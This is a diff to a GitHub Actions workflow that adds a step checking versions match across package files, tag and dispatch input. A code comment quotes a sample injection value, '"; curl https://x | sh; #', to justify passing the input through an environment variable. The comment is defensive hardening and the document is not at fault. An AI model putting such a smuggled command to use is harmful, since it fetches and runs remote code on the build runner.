@@ -83,6 +83,37 @@ jobs:
       - name: Install
         run: pnpm install --frozen-lockfile --ignore-scripts
 
+      - name: Version-match check
+        # Pass dispatch input via env (NOT inline `${{ }}` interpolation
+        # in a shell script) so a crafted version like
+        #   "; curl https://x | sh; #
+        # cannot break out of the double-quoted string. The env-var
+        # round-trip treats the input as data, not code. Mirrors the
+        # H-3-shape fix applied to `mcp-publish.yml` 2026-05-10.
+        env:
+          GH_REF_NAME: ${{ github.ref_name }}
+          DISPATCH_VERSION: ${{ inputs.version }}
+        run: |
+          set -euo pipefail
+          PKG=$(node -p "require('./packages/openclaw-skill/package.json').version")
+          MAN=$(node -p "require('./packages/openclaw-skill/manifest.json').version")
+          BUNDLED=$(node -p "require('./packages/openclaw-skill/manifest.json').mcp.bundled_version")
+          MCP_PKG=$(node -p "require('./packages/mcp/package.json').version")
+          # Strip leading "openclaw-skill-v" from tag, or use the dispatch input.
+          TAG="${GH_REF_NAME#openclaw-skill-v}"
+          if [ -n "${DISPATCH_VERSION:-}" ]; then
+            TAG="$DISPATCH_VERSION"
+          fi
+          if [ "$PKG" != "$MAN" ] || [ "$PKG" != "$TAG" ]; then
+            echo "Version skew: package.json=$PKG manifest.json=$MAN tag/dispatch=$TAG"
+            exit 1
+          fi
+          if [ "$BUNDLED" != "$MCP_PKG" ]; then
+            echo "Bundled-version skew: manifest.json#mcp.bundled_version=$BUNDLED packages/mcp/package.json=$MCP_PKG"
+            exit 1
+          fi
+          echo "version: $PKG (matched across package.json + manifest.json + tag); bundled @muhaven/mcp pinned to $BUNDLED"
+
       - name: Verify subset partition
         run: pnpm --filter @muhaven/openclaw-skill verify-subset
 
